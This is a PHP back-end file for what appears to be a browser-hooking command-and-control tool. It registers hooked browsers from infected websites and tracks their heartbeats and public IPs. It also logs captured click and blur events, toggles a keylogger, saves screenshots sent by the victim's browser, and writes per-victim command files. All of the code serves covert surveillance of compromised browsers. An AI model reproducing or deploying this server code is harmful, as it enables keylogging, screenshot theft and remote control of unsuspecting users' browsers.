<?php
    require_once('database.php');
    include_once('commands.inc.php'); 
    connectToDatabase();

   /*   Insert new hooked browser in DB
    *       $browserID = the id browser generated in hook.js
    *       $userAgent = the userAgent send by the hooked browser
    *       $hostname = the hostname of the infected website
    */
    function initHook($browserId, $userAgent, $hostname) {

        if(isset($browserId) && !empty($browserId)) {
            
            // Check User Agent
            if(!isset($userAgent)) { 
                $userAgent = "N/A";
            }

            // Check hostname
            if(!isset($hostname)) { 
                $hostname = "N/A";
            }           

            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO hooked_browsers (last_heartbeat, browser_id, user_agent, hostname) VALUES (NOW(3), ?, ?, ?)"))) {
                return;
            }    
            if(!$stmt->bind_param("sss", $browserId, $userAgent, $hostname)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }

    /*  Update if hooked browser is online.offline
    *       $browserID = the id browser generated in hook.js
    */
    function heartbeat($browserId) {     
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("UPDATE hooked_browsers SET last_heartbeat = NOW(3) WHERE browser_id = ?"))) {
                return;
            }          
            if (!$stmt->bind_param("s", $browserId)) {
                return;
            }          
            if (!$stmt->execute()) {
                return;
            }
        }   
    }

    /*   Update hooked browser with public IP (for geoloc)
    *       $browserID = the id browser generated in hook.js
    *       $publicIP = the public IP retrive from API called by hook.js
    */
    function getPublicIP($browserId, $publicIP) {     
        if(isset($browserId) && !empty($browserId)) {
            if(isset($publicIP) && !empty($publicIP)) {
                // Check IP is valid
                if(filter_var($publicIP, FILTER_VALIDATE_IP)) {
                    if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("UPDATE hooked_browsers SET public_ip = ? WHERE browser_id = ?"))) {
                        return;
                    }          
                    if (!$stmt->bind_param("ss", $publicIP, $browserId)) {
                        return;
                    }          
                    if (!$stmt->execute()) {
                        return;
                    }
                }
            }
        }   
    }

   /*   Analyse event sent by hooked browsers
    *   $browserID = the id browser generated in hook.js
    *   $type = type can be : 
    *       - info
    *       - onclick
    *       - onblur
    *       - command result
    *   $b64event = information on the event (b64 encoded)
    */
    function addEvent($browserId, $type, $module, $b64event, $imgDataURL) {
        if(isset($browserId) && !empty($browserId)) {
            if(isset($type) && !empty($type) && isset($b64event) && !empty($b64event)) {
                $event = base64_decode($b64event, TRUE);
                if($event === FALSE) {
                    $event = "{ An error occurred when analysing event data }";
                }

                if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO event_browsers (date, browser_id, type, module, event) VALUES (NOW(3), ?, ?, ?, ?)"))) {
                    return;
                }    
                if(!$stmt->bind_param("ssss", $browserId, $type, $module, $event)) {
                    return;
                }    
                if(!$stmt->execute()) {
                    return;
                }

                switch($type) {
                    case "Info":
                        if($event === "The Browser has been successfully hooked") { createCommandJsFile($browserId); }
                        if($event === "Keylogger is disabled (loading/reloading page)") { setDefaultKeyloggerState($browserId); }
                        break;

                    case "Command Result":
                        if($event === "keylogger enabled successfully") { keyloggerIsEnabled($browserId); }
                        if($event === "keylogger disabled successfully") { keyloggerIsDisabled($browserId); }
                        if($event === "Screenshot Done") { storeScreenshot($browserId, $imgDataURL); }
                        stopCommand($browserId);
                        break;

                    case "keylogger":
                        break;
                }
            }
        }
    }

   /*   Insert new keylogger (disabled by default), or refresh state when user reload the page
    *   $browserID = the id browser generated in hook.js
    */
    function setDefaultKeyloggerState($browserId) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO keylogger_browsers (date, browser_id, keylogger_func) VALUES (NOW(3), ?, 'disabled') ON DUPLICATE KEY UPDATE date = NOW(3), keylogger_func = 'disabled'"))) { 
                echo "keylogger error";
                return;
            }    
            if(!$stmt->bind_param("s", $browserId)) {
                echo "keylogger error";
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }

            $stmt->free_result();
            $stmt->close(); 
        }
    }

   /*   Create specific directory for the hooked browser
    *   $browserID = the id browser generated in hook.js
    */
    function createCommandJsFile($browserId) {
        if(isset($browserId) && !empty($browserId)) {
           
            // Create browserId directory
            $dir = 'hooked_browsers/' . $browserId;
            mkdir($dir, 750);

            $dir = 'hooked_browsers' . '/' . $browserId . '/' . 'screenshots';
            mkdir($dir, 750);
            
            $file = 'hooked_browsers/' . $browserId . '/' . $browserId . '_commands.js';
            file_put_contents($file, '');
        }
    }

    function keyloggerIsDisabled($browserId) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("UPDATE keylogger_browsers SET keylogger_func = 'disabled' WHERE browser_id = ?"))) {
                return;
            }    
            if(!$stmt->bind_param("s", $browserId)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }

    function keyloggerIsEnabled($browserId) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("UPDATE keylogger_browsers SET keylogger_func = 'enabled' WHERE browser_id = ?"))) {
                return;
            }    
            if(!$stmt->bind_param("s", $browserId)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }

    function storeScreenshot($browserId, $imgDataURL) {
        if(isset($imgDataURL) && !empty($imgDataURL)) {
            $dir = 'hooked_browsers' . '/' . $browserId . '/' . 'screenshots/';
            $file = uniqid() . '.png';
            
            $imgDataURL = str_replace(' ', '+', $imgDataURL);
            $data = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $imgDataURL));

            
            file_put_contents($dir . $file, $data);
        }
    }

    function stopCommand($browserId) {   
        if(isset($browserId) && !empty($browserId)) {
            $file = 'hooked_browsers/' . $browserId . '/' . $browserId . '_commands.js';
            file_put_contents($file, '');
        }    
    }
?>